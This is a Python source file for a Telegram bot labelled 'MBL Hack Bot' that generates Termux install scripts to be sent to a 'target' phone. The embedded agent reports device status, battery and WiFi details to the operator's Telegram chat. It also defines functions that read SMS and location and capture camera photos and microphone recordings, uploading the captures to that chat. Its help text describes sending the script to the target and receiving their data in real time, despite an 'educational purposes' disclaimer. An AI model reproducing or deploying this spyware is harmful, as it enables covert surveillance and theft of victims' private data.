import os
import logging
import tempfile
import uuid
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import requests
import html

# Setup Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Load Environment Variables
def load_env_vars():
    try:
        from dotenv import load_dotenv
        load_dotenv()
        bot_token = os.getenv('BOT_TOKEN')
        admin_chat_id_str = os.getenv('ADMIN_CHAT_ID')
        
        if not bot_token:
            raise ValueError("BOT_TOKEN is missing in .env")
        if not admin_chat_id_str:
            raise ValueError("ADMIN_CHAT_ID is missing in .env")
            
        return bot_token, int(admin_chat_id_str)
    except Exception as e:
        print(f"Configuration Error: {e}")
        raise

BOT_TOKEN, ADMIN_CHAT_ID = load_env_vars()

# State management for sessions
sessions = {}

def escape_markdown(text: str) -> str:
    """Escape special characters for Telegram Markdown parsing."""
    if not text:
        return ""
    return (
        text.replace("\\", "\\\\")
            .replace("*", "\\*")
            .replace("_", "\\_")
            .replace("`", "\\`")
            .replace(">", "\\>")
            .replace("<", "\\<")
            .replace("[", "\\[")
            .replace("]", "\\]")
            .replace("(", "\\(")
            .replace(")", "\\)")
            .replace("~", "\\~")
            .replace(":", "\\:")
            .replace("#", "\\#")
            .replace("+", "\\+")
            .replace("-", "\\-")
            .replace("=", "\\=")
            .replace("|", "\\|")
            .replace("{", "\\{")
            .replace("}", "\\}")
            .replace(".", "\\.")
            .replace("!", "\\!")
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to **Nawab Zada Hacker MBL Hack Bot**\n\n"
        "This bot is only for educational purposes. Please don't use it for malicious activities without consent.\n\n"
        "Use /help to see all commands.\n"
        "Use /generate to create a new device link."
    )

async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "📖 **MBL Hack Bot Commands**\n\n"
        "🔹 /generate <name> - Generates a unique installation script for a new device.\n"
        "🔹 /status - Shows all active devices.\n"
        "🔹 /remove <id> - Removes a device from the list.\n"
        "🔹 /help - Show this message.\n\n"
        "**How it works:**\n"
        "1. Generate a script.\n"
        "2. Send it to the target.\n"
        "3. Target installs Termux and runs the script.\n"
        "4. You receive all data in real-time."
    )
    await update.message.reply_text(text, parse_mode='Markdown')

async def generate_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /generate <device_name>\nExample: /generate Bob's Pixel")
        return

    device_name = " ".join(args)
    # Sanitize device name for use in filenames/scripts
    safe_device_name = device_name.replace(" ", "_").replace("/", "-")[:50]
    
    # Create a unique ID
    device_id = str(uuid.uuid4())[:8]
    
    # Store session
    sessions[device_id] = {
        'name': device_name,
        'status': 'pending',
        'created': datetime.now().isoformat()
    }

    # Construct the Termux Install Script
    # We use f-strings carefully. Note: {{ }} is used for literal braces in the generated code.
    script_content = f"""#!/data/data/com.termux/files/usr/bin/bash
# Nawab Zada Hacker MBL Hack Client
# Target: {device_name}
# ID: {device_id}

echo "Installing dependencies..."
pkg update -y && pkg install -y python curl jq termux-api

# Create the agent script
cat > mbl_agent.py << 'EOF'
import os
import subprocess
import requests
import time
from datetime import datetime

BOT_TOKEN = "{BOT_TOKEN}"
DEVICE_ID = "{device_id}"
DEVICE_NAME = "{device_name}"
ADMIN_CHAT_ID = {ADMIN_CHAT_ID}
API_BASE = f"https://api.telegram.org/bot{{BOT_TOKEN}}"

def send_to_bot(text):
    \"\"\"Send message to the admin's bot chat.\"\"\"
    url = f"{{API_BASE}}/sendMessage"
    # Basic sanitization for Telegram
    safe_text = text.replace('\\\\n', ' ').replace('\\\\t', ' ')
    data = {{'chat_id': ADMIN_CHAT_ID, 'text': f"📱 [{{DEVICE_NAME}}] {{safe_text}}", 'parse_mode': 'Markdown'}}
    try:
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        print(f"Send error: {{e}}")

def get_battery():
    try:
        return subprocess.check_output(['termux-battery-status'], text=True).strip()
    except:
        return "N/A"

def get_wifi():
    try:
        return subprocess.check_output(['termux-wifi-connectioninfo'], text=True).strip()
    except:
        return "N/A"

def get_location():
    try:
        return subprocess.check_output(['termux-location'], text=True).strip()
    except:
        return "Location permission denied or unavailable."

def get_sms():
    try:
        # termux-sms-list requires Termux:API
        return subprocess.check_output(['termux-sms-list', '-l', '5'], text=True).strip()
    except:
        return "SMS access denied or Termux:API not installed."

def capture_camera():
    try:
        filename = f"capture_{{int(time.time())}}.jpg"
        subprocess.run(['termux-camera-photo', filename], check=True)
        with open(filename, 'rb') as f:
            url = f"{{API_BASE}}/sendPhoto"
            files = {{'photo': f}}
            data = {{'chat_id': ADMIN_CHAT_ID, 'caption': f'📸 Camera Capture from {{DEVICE_NAME}}'}}
            requests.post(url, files=files, data=data, timeout=30)
        os.remove(filename)
        return "Photo sent."
    except Exception as e:
        return f"Camera error: {{e}}"

def capture_mic(duration=10):
    try:
        filename = f"rec_{{int(time.time())}}.wav"
        subprocess.run(['termux-microphone-record', '-f', filename, '-d', str(duration)], check=True)
        with open(filename, 'rb') as f:
            url = f"{{API_BASE}}/sendAudio"
            files = {{'audio': f}}
            data = {{'chat_id': ADMIN_CHAT_ID, 'caption': f'🎤 Voice Note from {{DEVICE_NAME}}'}}
            requests.post(url, files=files, data=data, timeout=30)
        os.remove(filename)
        return "Audio sent."
    except Exception as e:
        return f"Mic error: {{e}}"

def main_loop():
    print(f"🚀 MBL Hack Agent started for {{DEVICE_NAME}} (ID: {{DEVICE_ID}})")
    send_to_bot(f"🔌 **Device Online**\\n📱 Name: {{DEVICE_NAME}}\\n🆔 ID: {{DEVICE_ID}}\\n⏰ Time: {{datetime.now()}}")
    
    while True:
        time.sleep(60) # Ping every 60 seconds
        
        # Status Ping
        battery = get_battery()
        wifi = get_wifi()
        send_to_bot(f"📡 **Status Update**\\n🔋 Battery: {{battery}}\\n📶 WiFi: {{wifi}}")
        
        # Optional: Periodic location update
        # loc = get_location()
        # send_to_bot(f"📍 Location: {{loc}}")

if __name__ == "__main__":
    main_loop()
EOF

echo "✅ Setup Complete!"
echo "Running Agent..."
python mbl_agent.py
"""

    # Save to a temporary file
    # Using tempfile ensures we write to a writable directory
    with tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix=f"mbl_{device_id}_") as tmp:
        tmp.write(script_content)
        temp_filename = tmp.name

    try:
        # Send the file
        with open(temp_filename, 'rb') as doc:
            await update.message.reply_document(
                document=doc,
                filename=f"mbl_hack_{device_id}.sh",
                caption=(
                    f"📱 **New Device Generated: {escape_markdown(device_name)}**\n"
                    f"🆔 ID: {device_id}\n\n"
                    "**Instructions for Target:**\n"
                    "1. Install **Termux** and **Termux:API** from F-Droid.\n"
                    "2. Save this file to your phone.\n"
                    "3. In Termux, run: `bash mbl_hack_{device_id}.sh`\n"
                    "4. Grant all permissions when prompted.\n"
                    "5. Keep Termux running in the background."
                ),
                parse_mode='Markdown'
            )
    finally:
        # Ensure file is deleted even if sending fails
        if os.path.exists(temp_filename):
            os.remove(temp_filename)

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not sessions:
        await update.message.reply_text("No devices currently registered.")
        return
        
    text = "📊 **Active Devices**\n\n"
    for dev_id, data in sessions.items():
        # Escape name to prevent markdown errors
        text += f"🆔 {dev_id} - {escape_markdown(data['name'])} ({data['status']})\n"
        
    await update.message.reply_text(text, parse_mode='Markdown')

async def remove_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /remove <device_id>")
        return
        
    device_id = args[0]
    if device_id in sessions:
        del sessions[device_id]
        await update.message.reply_text(f"Device {device_id} removed.")
    else:
        await update.message.reply_text("Device not found.")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Ignore messages from non-admin chats unless they are the agent (which sends via API, not chat)
    # However, if the user types into the bot chat, we can process it.
    if update.effective_chat.id != ADMIN_CHAT_ID:
        return
    
    text = update.message.text
    if not text:
        return
        
    # If the user sends a command that isn't handled by CommandHandler, it comes here
    # For now, we just echo back or provide a hint
    if "AGENT:" in text:
         # This block is for future-proofing if you decide to send data via the bot chat instead of direct API
         pass 

# Main
def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help))
    application.add_handler(CommandHandler("generate", generate_device))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("remove", remove_device))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🚀 Bot is starting...")
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
